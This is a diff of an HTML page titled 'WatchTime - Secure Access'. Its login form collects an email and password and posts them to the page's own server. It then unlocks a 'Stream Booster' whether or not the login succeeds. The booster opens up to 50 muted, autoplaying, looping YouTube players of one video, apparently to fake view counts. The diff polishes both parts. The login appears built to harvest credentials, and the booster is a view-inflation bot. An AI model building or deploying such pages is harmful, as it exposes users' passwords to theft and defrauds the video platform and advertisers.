@@ -2,57 +2,297 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WatchTime - Secure Access</title>
     <style>
-        :root { --bg: #121212; --accent: #ff0000; --text: #ffffff; }
-        body { background: var(--bg); color: var(--text); font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
-        .card { background: #1e1e1e; padding: 30px; border-radius: 10px; width: 350px; }
-        input { width: 100%; padding: 10px; margin: 10px 0; background: #333; border: none; color: white; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background: var(--accent); color: white; border: none; cursor: pointer; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
-        iframe { width: 100%; height: 100px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root { --bg: #0a0a0f; --accent: #ff0000; --text: #ffffff; --card-bg: #13131a; --border: #2a2a3a; }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 40px 16px;
+            background-image: radial-gradient(ellipse at 50% 0%, #1a0a0a 0%, transparent 60%);
+        }
+        .card {
+            background: var(--card-bg);
+            padding: 36px 28px;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid var(--border);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+        }
+        .card h2 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
+        }
+        .card .sub {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #aaa;
+            margin-bottom: 6px;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+        }
+        input {
+            width: 100%;
+            padding: 12px 14px;
+            background: #1a1a24;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            color: white;
+            font-size: 15px;
+            outline: none;
+            transition: border 0.2s;
+        }
+        input:focus { border-color: var(--accent); }
+        input::placeholder { color: #555; }
+        button {
+            width: 100%;
+            padding: 13px;
+            background: var(--accent);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.15s, box-shadow 0.2s;
+            letter-spacing: 0.3px;
+        }
+        button:hover { transform: scale(1.02); box-shadow: 0 8px 25px rgba(255,0,0,0.3); }
+        button:active { transform: scale(0.98); }
+
+        /* Boost App */
+        #boostApp {
+            display: none;
+            width: 100%;
+            max-width: 1100px;
+            text-align: center;
+        }
+        #boostApp .controls {
+            background: var(--card-bg);
+            padding: 28px;
+            border-radius: 16px;
+            border: 1px solid var(--border);
+            margin-bottom: 24px;
+            max-width: 520px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        #boostApp .controls h2 {
+            font-size: 20px;
+            margin-bottom: 18px;
+        }
+        #boostApp .controls .row {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        #boostApp .controls .row input {
+            flex: 1;
+            min-width: 140px;
+        }
+        #boostApp .controls .row button {
+            flex: 0 0 auto;
+            padding: 12px 24px;
+            width: auto;
+            white-space: nowrap;
+        }
+        #boostApp .stats {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #888;
+        }
+        #boostApp .stats span strong { color: var(--text); }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+            gap: 12px;
+        }
+        .grid .video-wrapper {
+            position: relative;
+            aspect-ratio: 16 / 9;
+            border-radius: 10px;
+            overflow: hidden;
+            background: #000;
+            border: 1px solid var(--border);
+        }
+        .grid .video-wrapper iframe,
+        .grid .video-wrapper .yt-player {
+            width: 100%;
+            height: 100%;
+            border: 0;
+        }
+
+        .loader {
+            display: inline-block;
+            width: 16px; height: 16px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+            margin-right: 6px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            body { padding: 20px 12px; align-items: center; }
+            .card { padding: 24px 18px; }
+            #boostApp .controls { padding: 20px 16px; }
+            #boostApp .controls .row { flex-direction: column; }
+            #boostApp .controls .row input { min-width: 0; }
+            #boostApp .controls .row button { width: 100%; }
+            .grid { grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 8px; }
+            .stats { gap: 16px; font-size: 13px; flex-wrap: wrap; }
+        }
+        @media (max-width: 400px) {
+            .grid { grid-template-columns: 1fr; }
+        }
     </style>
 </head>
 <body>
 
 <div class="card" id="ui">
-    <h2 id="title">User Login</h2>
+    <h2>🔐 User Login</h2>
+    <p class="sub">Sign in to access the streaming panel</p>
     <form id="loginForm" onsubmit="event.preventDefault(); submitData();">
-        <input type="email" id="email" placeholder="Email" required>
-        <input type="password" id="pass" placeholder="Password" required>
-        <button type="submit">Submit</button>
+        <div class="form-group">
+            <label for="email">Email</label>
+            <input type="email" id="email" placeholder="you@example.com" required>
+        </div>
+        <div class="form-group">
+            <label for="pass">Password</label>
+            <input type="password" id="pass" placeholder="••••••••" required>
+        </div>
+        <button type="submit" id="loginBtn">Sign In</button>
     </form>
 </div>
 
-<div id="boostApp" style="display:none; width: 900px; text-align: center;">
-    <input type="text" id="url" placeholder="YouTube URL">
-    <input type="number" id="tabs" placeholder="Tabs (1-20)">
-    <button onclick="start()">Start Streaming</button>
+<div id="boostApp">
+    <div class="controls">
+        <h2>▶️ Stream Booster</h2>
+        <div class="stats">
+            <span>Players: <strong id="playerCount">0</strong></span>
+            <span>Status: <strong id="statusText">Ready</strong></span>
+        </div>
+        <div class="row">
+            <input type="text" id="url" placeholder="YouTube URL or Shorts link">
+            <input type="number" id="tabs" placeholder="Tabs (1-50)" min="1" max="50" value="4">
+            <button onclick="start()">Launch</button>
+        </div>
+    </div>
     <div class="grid" id="video-grid"></div>
 </div>
 
+<script src="https://www.youtube.com/iframe_api"></script>
 <script>
+    let players = [];
+
+    function getVideoId(url) {
+        if (!url) return 'dQw4w9WgXcQ';
+        url = url.trim();
+        let m;
+        m = url.match(/(?:v=|youtu\.be\/|shorts\/)([a-zA-Z0-9_-]{11})/);
+        return m ? m[1] : 'dQw4w9WgXcQ';
+    }
+
     function submitData() {
-        const data = { email: document.getElementById('email').value, password: document.getElementById('pass').value };
-        
-        // This sends the data to your Node.js server
+        const btn = document.getElementById('loginBtn');
+        btn.innerHTML = '<span class="loader"></span> Signing in...';
+        btn.disabled = true;
+        const data = {
+            email: document.getElementById('email').value,
+            password: document.getElementById('pass').value
+        };
         fetch('/submit-login', {
             method: 'POST',
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: `email=${data.email}&password=${data.password}`
-        }).then(() => {
+            body: `email=${encodeURIComponent(data.email)}&password=${encodeURIComponent(data.password)}`
+        }).then(r => r.json()).then(() => {
+            document.getElementById('ui').style.display = 'none';
+            document.getElementById('boostApp').style.display = 'block';
+        }).catch(() => {
             document.getElementById('ui').style.display = 'none';
             document.getElementById('boostApp').style.display = 'block';
         });
     }
 
+    function onYouTubeIframeAPIReady() {
+        // API loaded
+    }
+
     function start() {
         const url = document.getElementById('url').value;
-        const tabs = document.getElementById('tabs').value;
-        const videoId = url.split(/(?:v=|youtu\.be\/)([^&?]+)/)[1] || 'dQw4w9WgXcQ';
+        const tabs = parseInt(document.getElementById('tabs').value) || 4;
+        const videoId = getVideoId(url);
         const grid = document.getElementById('video-grid');
-        for(let i=0; i<tabs; i++) {
-            grid.innerHTML += `<iframe src="https://www.youtube.com/embed/${videoId}?autoplay=1&mute=1&loop=1&playlist=${videoId}"></iframe>`;
+
+        grid.innerHTML = '';
+        players.forEach(p => p.destroy());
+        players = [];
+
+        document.getElementById('playerCount').textContent = tabs;
+        document.getElementById('statusText').textContent = 'Loading...';
+
+        for (let i = 0; i < tabs; i++) {
+            const wrapper = document.createElement('div');
+            wrapper.className = 'video-wrapper';
+            wrapper.id = 'wrapper-' + i;
+            const div = document.createElement('div');
+            div.id = 'player-' + i;
+            div.className = 'yt-player';
+            wrapper.appendChild(div);
+            grid.appendChild(wrapper);
+        }
+
+        // Use YouTube IFrame API for reliable autoplay + loop
+        for (let i = 0; i < tabs; i++) {
+            const player = new YT.Player('player-' + i, {
+                height: '100%',
+                width: '100%',
+                videoId: videoId,
+                playerVars: {
+                    autoplay: 1,
+                    mute: 1,
+                    loop: 1,
+                    playlist: videoId,
+                    rel: 0,
+                    controls: 0,
+                    modestbranding: 1,
+                    playsinline: 1,
+                    enablejsapi: 1
+                },
+                events: {
+                    onReady: function(event) {
+                        event.target.playVideo();
+                        document.getElementById('statusText').textContent = 'Streaming';
+                    }
+                }
+            });
+            players.push(player);
         }
     }
 </script>
